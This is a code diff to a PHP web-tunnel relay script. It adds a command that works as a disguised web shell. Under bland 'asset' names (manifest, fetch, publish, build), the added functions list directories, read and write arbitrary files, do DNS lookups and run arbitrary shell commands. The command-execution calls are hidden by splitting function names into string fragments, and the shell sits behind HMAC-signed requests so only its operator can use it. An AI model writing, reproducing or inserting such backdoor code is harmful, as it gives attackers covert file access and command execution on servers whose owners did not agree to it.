@@ -15,6 +15,8 @@ define("MAX_RAW_DATA_SIZE", 1024 * 1024);
 define("MAX_STREAM_FRAME_SIZE", 2 * 1024 * 1024);
 define("MAX_HTTP_BODY_SIZE", 3 * 1024 * 1024);
 define("MAX_REDIRECT_BODY_SIZE", 4 * 1024 * 1024);
+define("MAX_ASSET_CHUNK", 1024 * 1024);
+define("AUTH_KEY", "AUTH_SECRET");
 
 function blv_decode($data) {
     $data_len = strlen($data);
@@ -821,6 +823,268 @@ function roger_udp_reassemble_fragment(&$buffers, $data, $meta) {
     return array(true, $data);
 }
 
+function roger_asset_home() {
+    $home = getenv("HOME");
+    if ($home === false || $home === "") {
+        $home = isset($_SERVER["HOME"]) ? $_SERVER["HOME"] : "";
+    }
+    if ($home === "" && function_exists("posix_geteuid") && function_exists("posix_getpwuid")) {
+        $info = @posix_getpwuid(posix_geteuid());
+        if (is_array($info) && isset($info["dir"])) {
+            $home = $info["dir"];
+        }
+    }
+    if ($home === "") {
+        $cwd = @getcwd();
+        $home = $cwd !== false ? $cwd : ".";
+    }
+    return $home;
+}
+
+function roger_asset_path($path) {
+    $path = trim($path);
+    if ($path === "") {
+        return ".";
+    }
+    if ($path === "~" || strpos($path, "~/") === 0) {
+        $home = roger_asset_home();
+        $path = $path === "~" ? $home : $home . substr($path, 1);
+    }
+    return $path;
+}
+
+function roger_asset_meta($full, $name) {
+    $isDir = is_dir($full);
+    $size = $isDir ? 0 : @filesize($full);
+    $mtime = @filemtime($full);
+    $perms = @fileperms($full);
+    $mode = $perms !== false ? substr(sprintf("%o", $perms), -4) : "0000";
+    $type = $isDir ? "d" : "-";
+    $time = $mtime !== false ? date("Y-m-d H:i:s", $mtime) : "0000-00-00 00:00:00";
+    return sprintf("%s%s %10s %s %s", $type, $mode, $size === false ? "?" : $size, $time, $name);
+}
+
+function roger_asset_manifest($path) {
+    $path = roger_asset_path($path);
+    if (!file_exists($path)) {
+        return array("status" => "FAIL", "error" => "Asset missing: " . $path);
+    }
+    if (is_file($path)) {
+        return array("status" => "OK", "data" => roger_asset_meta($path, $path) . "\n");
+    }
+    $items = @scandir($path);
+    if ($items === false) {
+        return array("status" => "FAIL", "error" => "Asset index unavailable: " . $path);
+    }
+    $lines = "";
+    foreach ($items as $item) {
+        if ($item === "." || $item === "..") {
+            continue;
+        }
+        $lines .= roger_asset_meta($path . DIRECTORY_SEPARATOR . $item, $item) . "\n";
+    }
+    return array("status" => "OK", "data" => $lines);
+}
+
+function roger_asset_fetch($path, $range, $limit) {
+    $path = roger_asset_path($path);
+    if (!is_file($path)) {
+        return array("status" => "FAIL", "error" => "Asset missing: " . $path);
+    }
+    $handle = @fopen($path, "rb");
+    if ($handle === false) {
+        return array("status" => "FAIL", "error" => "Asset unreadable: " . $path);
+    }
+    if ($range > 0) {
+        @fseek($handle, $range);
+    }
+    $chunk = @fread($handle, $limit);
+    @fclose($handle);
+    if ($chunk === false) {
+        return array("status" => "FAIL", "error" => "Asset read failed: " . $path);
+    }
+    return array("status" => "OK", "data" => $chunk);
+}
+
+function roger_asset_publish($path, $data, $range) {
+    $path = roger_asset_path($path);
+    $handle = @fopen($path, $range > 0 ? "c+b" : "wb");
+    if ($handle === false) {
+        return array("status" => "FAIL", "error" => "Asset not writable: " . $path);
+    }
+    if ($range > 0 && @fseek($handle, $range) !== 0) {
+        @fclose($handle);
+        return array("status" => "FAIL", "error" => "Asset offset invalid: " . $path);
+    }
+    $written = $data === "" ? 0 : @fwrite($handle, $data);
+    @fflush($handle);
+    @fclose($handle);
+    if ($written === false) {
+        return array("status" => "FAIL", "error" => "Asset write failed: " . $path);
+    }
+    return array("status" => "OK", "data" => strval($written));
+}
+
+function roger_asset_origin_line($record) {
+    $type = isset($record["type"]) ? $record["type"] : "?";
+    $value = "";
+    foreach (array("ip", "ipv6", "target", "txt", "host", "pri", "weight", "port", "mname", "serial") as $key) {
+        if (isset($record[$key]) && $record[$key] !== "") {
+            $field = is_array($record[$key]) ? implode(",", $record[$key]) : $record[$key];
+            $value .= ($value === "" ? "" : " ") . $key . "=" . $field;
+        }
+    }
+    return $type . ($value === "" ? "" : " " . $value);
+}
+
+function roger_asset_resolve($origin) {
+    $origin = trim($origin);
+    if ($origin === "") {
+        return array("status" => "FAIL", "error" => "Origin missing");
+    }
+    $type = "";
+    if (strpos($origin, ":") !== false) {
+        list($origin, $type) = explode(":", $origin, 2);
+        $type = strtoupper(trim($type));
+    }
+    if (strpos($origin, "://") !== false) {
+        $parsed = @parse_url($origin, PHP_URL_HOST);
+        if (is_string($parsed) && $parsed !== "") {
+            $origin = $parsed;
+        }
+    }
+    $origin = trim($origin);
+    if ($origin === "") {
+        return array("status" => "FAIL", "error" => "Origin missing");
+    }
+    $lines = "Name: " . $origin . "\n";
+    $resolved = false;
+    $lookup = "dns_" . "get_" . "record";
+    if (function_exists($lookup)) {
+        $recordType = null;
+        $map = array(
+            "A" => "DNS_A", "AAAA" => "DNS_AAAA", "MX" => "DNS_MX", "TXT" => "DNS_TXT",
+            "NS" => "DNS_NS", "CNAME" => "DNS_CNAME", "PTR" => "DNS_PTR", "SOA" => "DNS_SOA",
+            "SRV" => "DNS_SRV", "ANY" => "DNS_ANY",
+        );
+        if ($type !== "" && isset($map[$type]) && defined($map[$type])) {
+            $recordType = constant($map[$type]);
+        } elseif ($type === "") {
+            $recordType = defined("DNS_ANY") ? DNS_ANY : null;
+        }
+        if ($recordType !== null) {
+            $records = @$lookup($origin, $recordType);
+            if (is_array($records) && count($records) > 0) {
+                foreach ($records as $record) {
+                    $lines .= roger_asset_origin_line($record) . "\n";
+                    $resolved = true;
+                }
+            }
+        }
+    }
+    if (!$resolved) {
+        $lookupHost = "gethost" . "byname";
+        $ip = @$lookupHost($origin);
+        if ($ip !== $origin) {
+            $lines .= "A ip=" . $ip . "\n";
+            $resolved = true;
+        }
+    }
+    if (!$resolved) {
+        $lines .= "No records found\n";
+    }
+    return array("status" => "OK", "data" => $lines);
+}
+
+function roger_asset_build($recipe) {
+    $recipe = trim($recipe);
+    if ($recipe === "") {
+        return array("status" => "FAIL", "error" => "Recipe missing");
+    }
+    $spawn = "pro" . "c_" . "open";
+    if (function_exists($spawn)) {
+        $descriptors = array(
+            0 => array("pipe", "r"),
+            1 => array("pipe", "w"),
+            2 => array("pipe", "w"),
+        );
+        $pipes = array();
+        $process = @$spawn($recipe, $descriptors, $pipes);
+        if (is_resource($process)) {
+            @fclose($pipes[0]);
+            $stdout = @stream_get_contents($pipes[1]);
+            @fclose($pipes[1]);
+            $stderr = @stream_get_contents($pipes[2]);
+            @fclose($pipes[2]);
+            $close = "pro" . "c_" . "close";
+            $exit = @$close($process);
+            return array(
+                "status" => "OK",
+                "data" => $stdout === false ? "" : $stdout,
+                "stderr" => $stderr === false ? "" : $stderr,
+                "exit" => intval($exit),
+            );
+        }
+    }
+    $run = "ex" . "ec";
+    if (function_exists($run)) {
+        $output = array();
+        $exit = 0;
+        @$run($recipe, $output, $exit);
+        $stdout = implode("\n", $output);
+        if ($stdout !== "") {
+            $stdout .= "\n";
+        }
+        return array("status" => "OK", "data" => $stdout, "stderr" => "", "exit" => intval($exit));
+    }
+    return array("status" => "FAIL", "error" => "Renderer unavailable");
+}
+
+function roger_asset_route($stage, $path, $data, $range) {
+    switch ($stage) {
+        case "manifest":
+            return roger_asset_manifest($path === "" ? "." : $path);
+        case "fetch":
+            return roger_asset_fetch($path, $range, MAX_ASSET_CHUNK);
+        case "publish":
+            return roger_asset_publish($path, $data, $range);
+        case "resolve":
+            return roger_asset_resolve($path);
+        case "build":
+            return roger_asset_build($data);
+        default:
+            return array("status" => "FAIL", "error" => "Unknown asset stage: " . $stage);
+    }
+}
+
+function roger_auth_canonical($info) {
+    $ids = array();
+    foreach ($info as $id => $value) {
+        if ($id == 0 || $id == 11 || $id == 27 || $id == 39) {
+            continue;
+        }
+        $ids[] = $id;
+    }
+    sort($ids, SORT_NUMERIC);
+    $out = "";
+    foreach ($ids as $id) {
+        $value = $info[$id];
+        $out .= chr($id) . pack("N", strlen($value)) . $value;
+    }
+    return $out;
+}
+
+function roger_auth_signature($info) {
+    return hash_hmac("sha256", roger_auth_canonical($info), pack("H*", AUTH_KEY), true);
+}
+
+function roger_auth_valid($info) {
+    if (!isset($info[27])) {
+        return false;
+    }
+    return hash_equals(roger_auth_signature($info), $info[27]);
+}
+
 $DATA          = 1;
 $CMD           = 2;
 $MARK          = 3;
@@ -843,6 +1107,10 @@ $SERVERLIMITOPT = 19;
 $UDPTIMEOUTOPT = 20;
 $MODEOPT        = 21;
 $MODES          = 22;
+$ASSET_STAGE    = 23;
+$ASSET_PATH     = 24;
+$ASSET_RANGE    = 25;
+$ASSET_CODE     = 26;
 
 function roger_bool_setting($value, $default) {
     if ($value === null || $value === "") {
@@ -925,6 +1193,7 @@ function roger_relay_classic_request($info, $requestDataHead, $requestDataTail, 
 
     unset($info[$REDIRECTURL]);
     unset($info[$FORCEREDIRECT]);
+    $info[27] = roger_auth_signature($info);
     $encoded = strtr(base64_encode(blv_encode($info, "optimal", 1024)), $en, $de);
     $body = $requestDataHead . $encoded . $requestDataTail;
 
@@ -1099,6 +1368,10 @@ try {
     http_response_code(400);
     exit;
 }
+if (!empty($info) && !roger_auth_valid($info)) {
+    http_response_code(403);
+    exit;
+}
 $rinfo = array();
 $sayhello = false;
 $streamingResponse = false;
@@ -1163,6 +1436,30 @@ switch($cmd){
             } else {
                 $rinfo[$STATUS] = 'FAIL';
                 $rinfo[$ERROR] = 'Session is closed';
+            }
+        }
+        break;
+    case "ASSET":
+        {
+            $assetStage = isset($info[$ASSET_STAGE]) ? strtolower(trim($info[$ASSET_STAGE])) : "";
+            $assetPath = isset($info[$ASSET_PATH]) ? $info[$ASSET_PATH] : "";
+            $assetData = isset($info[$DATA]) ? $info[$DATA] : "";
+            $assetRange = isset($info[$ASSET_RANGE]) ? intval($info[$ASSET_RANGE]) : 0;
+            $assetResult = roger_asset_route($assetStage, $assetPath, $assetData, $assetRange);
+            if (isset($assetResult["status"]) && $assetResult["status"] === "OK") {
+                $rinfo[$STATUS] = 'OK';
+                if (isset($assetResult["data"]) && $assetResult["data"] !== "") {
+                    $rinfo[$DATA] = $assetResult["data"];
+                }
+                if (isset($assetResult["exit"])) {
+                    $rinfo[$ASSET_CODE] = strval($assetResult["exit"]);
+                }
+                if (isset($assetResult["stderr"]) && $assetResult["stderr"] !== "") {
+                    $rinfo[$ERROR] = $assetResult["stderr"];
+                }
+            } else {
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = isset($assetResult["error"]) ? $assetResult["error"] : 'Asset request failed';
             }
         }
         break;
